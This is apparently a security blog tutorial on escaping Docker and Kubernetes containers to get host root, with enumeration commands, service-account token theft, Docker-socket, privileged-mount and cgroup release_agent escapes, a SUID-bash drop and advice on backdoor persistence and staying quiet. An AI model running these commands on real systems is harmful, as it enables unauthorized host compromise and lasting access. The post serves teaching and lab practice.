+++
date = '2025-11-10T11:51:55+05:30'
draft = false
title = 'Container Escape: From Enumeration to Host Root'
+++

{{< toc >}}

---

Containers have become the backbone of modern infrastructure, powering everything from microservices to CI/CD pipelines. But here's the uncomfortable truth: containers are not virtual machines. They're processes with fancy namespaces and cgroups, sharing the same kernel as the host. This fundamental architecture creates a fascinating attack surface for security researchers and red teamers.

---

## TL;DR: The One-Minute Version

If you only have sixty seconds, here's what you need to know about container escapes:

- Containers share the host kernel—they're *processes* with namespaces and cgroups, not VMs
- **First step is always enumeration:** Look for `/.dockerenv`, cgroups, capabilities, `/var/run/docker.sock`, writable host mounts, and Kubernetes service account tokens
- **High-risk escape vectors:** `--privileged` containers, mounted Docker socket, `CAP_SYS_ADMIN` capability, writable host paths, `hostPID`/`hostNetwork` in Kubernetes, and kernel CVEs

> **Quick Win Checklist:** If you find any of these, you're likely one command away from host access: privileged container, Docker socket mount, `CAP_SYS_ADMIN`, writable `/etc` or `/root` mount, elevated Kubernetes RBAC permissions.

---

## Understanding the Threat Model

### Why Containers Aren't Security Boundaries

The most important concept to understand is that containers are **not** security boundaries by design. They're isolation mechanisms built for resource management and application packaging, not for running untrusted code.

```
# Virtual Machine Model
Host Kernel → Hypervisor → Guest Kernel → Guest Process
(True isolation - separate kernels)

# Container Model  
Host Kernel → Container Runtime → Namespaces/Cgroups → Container Process
(Shared kernel - weaker isolation)
```

Because containers share the host kernel, any kernel vulnerability is automatically exploitable from inside containers. There's no additional security layer protecting the host from a compromised container—only namespace and capability restrictions, which are bypassable under many common misconfigurations.

### Common Misconceptions

- **"Containers are isolated"** — They have namespaced visibility, not true isolation
- **"Docker is secure by default"** — Default settings are better than they used to be, but misconfiguration is extremely common
- **"Kubernetes adds security"** — Kubernetes adds orchestration and some security features, but also expands the attack surface significantly
- **"Non-root containers are safe"** — Being non-root inside the container helps, but doesn't prevent escapes via capabilities or kernel exploits

---

## Full Enumeration Checklist

When you land inside a container, your first goal is reconnaissance. These commands help you understand your environment and identify potential escape vectors. All commands are designed to be quiet and avoid triggering obvious alerts.

### Environment & Basic Indicators

Start with quick checks to confirm you're in a container and identify the container runtime:

```bash
# Quick indicators
[ -f /.dockerenv ] && echo "dockerenv present"
cat /proc/1/cgroup
env | grep -iE 'kube|docker|container'
ls -la /
df -h
uname -a
```

> **What to look for:** The `/.dockerenv` file is a dead giveaway for Docker containers. In `/proc/1/cgroup`, you'll see paths containing "docker" or "kubepods". Environment variables often leak Kubernetes metadata.

### Files & Mounts

Check for the Docker socket (instant win), mounted filesystems, and writable directories that might be host mounts:

```bash
# Check docker socket, mounts, writeable host dirs
ls -la /var/run/docker.sock 2>/dev/null || true
mount | sed -n '1,200p'
find / -xdev -type d -writable 2>/dev/null | head -n 50
grep -R --line-number "kube" /proc/mounts 2>/dev/null || true
```

> **Critical Finding:** If `/var/run/docker.sock` exists and is accessible, you can control the Docker daemon and spawn privileged containers. This is a direct path to host root.

### Capabilities & Privilege Checks

Linux capabilities are the key to many container escapes. Check what capabilities your process has:

```bash
# Requires util-linux or libcap-utils; fallback to /proc
capsh --print 2>/dev/null || true
grep Cap /proc/self/status

# Privileged quick check
ip link add dummy0 type dummy 2>/dev/null && echo "likely privileged" || true
```

The `ip link add` command is a clever trick—only privileged containers can create network interfaces. If this succeeds, you're almost certainly in a privileged container.

### Docker Socket via cURL

If the Docker socket is mounted, you can query it even without the Docker client:

```bash
# If curl is present
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

> **Pro Tip:** The Docker API is RESTful and fully documented. You can create, start, stop, and execute commands in containers purely through HTTP requests to the socket.

### Kernel & Exploit Hunting

```bash
uname -r

# Optional: list kernel config info
zcat /proc/config.gz 2>/dev/null || true
```

The kernel version is critical for identifying known vulnerabilities. Tools like linux-exploit-suggester can help, but be cautious—kernel exploits can crash systems.

### Kubernetes-Specific Checks

In Kubernetes environments, check for service account tokens and API access:

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || true
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -n 1

# API server base URL
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces 2>/dev/null || true
```

> **Kubernetes Reality:** Most pods automatically mount service account tokens. If the service account has elevated RBAC permissions, you can interact with the Kubernetes API to create privileged pods, list secrets, or even gain cluster admin.

---

## High-Probability Escape Vectors

Now that we've covered enumeration, let's dive into the actual escape techniques. These are ordered by likelihood of success in real-world environments.

### 1. Privileged Containers

**Why it works:** The `--privileged` flag removes almost all namespace and cgroup enforcement, and grants access to all host devices including block devices.

**Detection:** Try creating a network interface with `ip link add dummy0 type dummy`. Success strongly indicates privileged mode.

**Exploitation Pattern:**
1. Identify you're privileged (network interface creation succeeds)
2. List available block devices with `fdisk -l`
3. Mount host filesystem to local directory
4. Chroot into mounted filesystem for full host access

```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host       # or other block devices you find
chroot /mnt/host /bin/bash
id
```

**What to do on the host:** Once you've chrooted into the host filesystem, you have full root access. Common persistence techniques include:

- Add SSH keys to `/root/.ssh/authorized_keys`
- Create new user accounts in `/etc/passwd` and `/etc/shadow`
- Add cron jobs or systemd services for persistence
- Install backdoors or additional access mechanisms

### 2. Mounted Docker Socket

**Why it works:** When `/var/run/docker.sock` is mounted into a container, that container can control the entire Docker daemon. This is equivalent to root on the host.

**Detection:**

```bash
ls -la /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

**Exploitation without Docker client:** You can interact with Docker purely through HTTP requests to the Unix socket:

```bash
# Create privileged container that mounts host root
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'

# Note the container ID from response, then start and attach
```

**If Docker client exists inside the container:**

```bash
docker run -v /:/host --privileged -it --rm alpine chroot /host sh
```

> **Why this is dangerous:** Mounting the Docker socket is surprisingly common in CI/CD pipelines, monitoring tools, and "Docker-in-Docker" setups. It's often done for convenience without understanding the security implications.

### 3. Excessive Capabilities

**Why it works:** Linux capabilities allow fine-grained privilege delegation. Several capabilities effectively grant root access when misused.

**Detection:**

```bash
capsh --print | grep Cap
cat /proc/self/status | grep Cap
```

#### Dangerous Capabilities

- **CAP_SYS_ADMIN:** Allows mounting filesystems, loading kernel modules, and many other privileged operations. This is nearly equivalent to full root access.
- **CAP_DAC_READ_SEARCH:** Bypass file read permission checks. Can read any file on the system regardless of permissions.
- **CAP_SYS_PTRACE:** Allows ptracing any process, including those on the host. Can inject code into host processes.
- **CAP_SYS_MODULE:** Load kernel modules. Instant kernel-level code execution.

**Exploitation example with CAP_SYS_ADMIN:**

```bash
# Mount host filesystem
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Find path on host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/exploit" > /tmp/cgrp/release_agent

# Create exploit script
cat > /exploit << EOF
#!/bin/sh
ps aux > $host_path/output
EOF
chmod a+x /exploit

# Trigger execution on host
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 4. Writable Host Mounts

**Why it works:** When host directories are bind-mounted into containers with write access, you can alter host files directly.

**High-value targets:**

- `/etc` — Modify system configurations, add user accounts, alter service configurations
- `/root` — Add SSH keys, modify shell profiles for backdoors
- Any directory used by init scripts — Add backdoors or SUID binaries that persist across reboots
- `/var/log` — Potentially write to log files that get processed by other services

**SUID Binary Escalation:**

```bash
# Drop SUID bash on host (lab environment only)
cp /bin/bash /mnt/host/tmp/suidbash
chown root:root /mnt/host/tmp/suidbash
chmod 4755 /mnt/host/tmp/suidbash

# On host, run:
# /tmp/suidbash -p  => instant root shell
```

> **Detection Tip:** Look for mount points in `df -h` or `mount` that show filesystem types like "ext4" or "xfs" rather than "overlay" or "tmpfs". These are often host mounts.

### 5. Kubernetes Service Account Tokens & RBAC

**Why it works:** Kubernetes pods automatically mount service account tokens by default. If the service account has elevated RBAC permissions, you can interact with the Kubernetes API to escalate privileges.

**Detection & Enumeration:**

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Check basic access
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# Check permissions
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles
```

**Exploitation strategies:**

- If you can create pods: Create a privileged pod with host filesystem mounted
- If you can exec into pods: Use kubectl exec equivalent via API to access other pods
- If you can read secrets: Enumerate all secrets in the cluster for credentials
- If you have cluster-admin: Full cluster compromise

> **Real-world note:** Many production Kubernetes clusters have overly permissive RBAC configurations. Service accounts often have more permissions than necessary due to convenience or troubleshooting needs.

### 6. Kernel Exploits

**Why it works:** Containers share the host kernel. Any kernel vulnerability is exploitable from inside containers, potentially leading to host compromise.

**Detection:** Identify kernel version with `uname -r` and cross-reference with known CVEs using tools like linux-exploit-suggester.

> **Extreme Caution Required:** Kernel exploits can crash the entire host system, taking down all containers and potentially corrupting data. Use only in isolated lab environments where system crashes are acceptable. Never use kernel exploits in production assessments without explicit authorization and acceptance of risk.

**Common kernel vulnerabilities used in container escapes:**

- Dirty COW (CVE-2016-5195) — Write to read-only memory mappings
- Dirty Pipe (CVE-2022-0847) — Overwrite data in arbitrary read-only files
- Various use-after-free vulnerabilities in kernel subsystems
- Privilege escalation through eBPF vulnerabilities

---

## Lab Setup & Practice

The best way to understand these techniques is to practice in a safe environment. Here's how to build your own container escape lab.

### Quick Vulnerable Lab Setup

```bash
# Privileged container
docker run -it --privileged ubuntu:latest bash

# Docker socket mounted
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:latest bash

# Writable host mount
docker run -it -v /:/host ubuntu:latest bash

# Excessive capabilities
docker run -it --cap-add=SYS_ADMIN ubuntu:latest bash
```

### Recommended Practice Resources

- **HackTheBox:** Several machines focused on container escapes
- **TryHackMe:** Docker and Kubernetes security rooms
- **Kubernetes Goat:** Intentionally vulnerable Kubernetes cluster for practice
- **Bad Pods:** Repository of vulnerable Kubernetes pod configurations

---

## Additional Resources

### Tools

- **amicontained:** Container introspection tool to identify capabilities and configuration
- **deepce:** Docker enumeration, escalation of privileges, and container escapes
- **cdk:** Zero dependency container penetration toolkit
- **kubectl-who-can:** Show who has RBAC permissions in Kubernetes
- **kube-hunter:** Hunt for security weaknesses in Kubernetes clusters
- **trivy:** Vulnerability scanner for containers and other artifacts

### Further Reading

- [Docker Security Documentation](https://docs.docker.com/engine/security/)
- [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [MITRE ATT&CK: Containers Matrix](https://attack.mitre.org/matrices/enterprise/containers/)
- [DeepCE - Docker Enumeration Tool](https://github.com/stealthcopter/deepce)

---

## Acknowledgments

Shoutout to [@rsgbengii](https://x.com/rsgbengii) for a wonderfull artcle on container security and awesome newsletter, never disappoints <\3